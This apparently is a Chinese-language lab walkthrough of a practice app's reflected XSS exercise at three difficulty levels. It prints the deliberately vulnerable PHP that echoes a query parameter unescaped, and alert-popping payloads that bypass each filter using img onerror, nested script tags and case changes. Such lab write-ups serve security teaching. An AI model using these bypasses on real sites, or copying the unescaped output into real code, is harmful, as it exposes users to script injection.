@@ -1,0 +1,79 @@
+# 链接(URL)：https://www.wuyini.cn/672.html
+
+XSS (Reflected) 反射型跨站脚本
+XSS 版块实际上之前单独写了一篇文章总结过：XSS从零开始
+
+Low
+Php
+
+<?php
+ 
+header ("X-XSS-Protection: 0");
+ 
+// Is there any input?
+if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
+    // Feedback for end user
+    $html .= '<pre>Hello ' . $_GET[ 'name' ] . '</pre>';
+}
+ 
+?>
+可以看看到对name变量没有任何的过滤措施，只是单纯的检测了name变量存在并且不为空就直接输出到了网页中。
+
+payloadJavascript
+
+<script>alert('XSS')</script>
+
+Medium
+Php
+
+<?php
+ 
+header ("X-XSS-Protection: 0");
+ 
+// Is there any input?
+if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
+    // Get input
+    $name = str_replace( '<script>', '', $_GET[ 'name' ] );
+ 
+    // Feedback for end user
+    $html .= "<pre>Hello ${name}</pre>";
+}
+ 
+?>
+只是简单的过滤了<script>标签，可以使用其他的标签绕过，这里因为正则匹配的规则问题，检测到敏感字符就将替换为空（即删除），也可以使用嵌套构造和大小写转换来绕过。
+
+使用其他的标签，通过事件来弹窗，这里有很多就不一一列举了：
+
+payload1
+
+<img src=x onerror=alert('XSS')>
+因为过滤规则的缺陷，这里可以使用嵌套构造来绕过：
+
+payload2
+
+<s<script>cript>alert('XSS')</script>
+因为正则匹配没有不区分大小写，所以这里通过大小写转换也是可以成功绕过的：
+
+payload3Javascript
+
+<Script>alert('XSS')</script>
+High
+Php
+
+<?php
+ 
+header ("X-XSS-Protection: 0");
+ 
+// Is there any input?
+if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
+    // Get input
+    $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] );
+ 
+    // Feedback for end user
+    $html .= "<pre>Hello ${name}</pre>";
+}
+ 
+?>
+这里的正则过滤更加完善了些，不区分大小写，并且使用了通配符去匹配，导致嵌套构造的方法也不能成功，但是还有其他很多标签来达到弹窗的效果：Javascript
+
+<img src=x onerror=alert('XSS')>
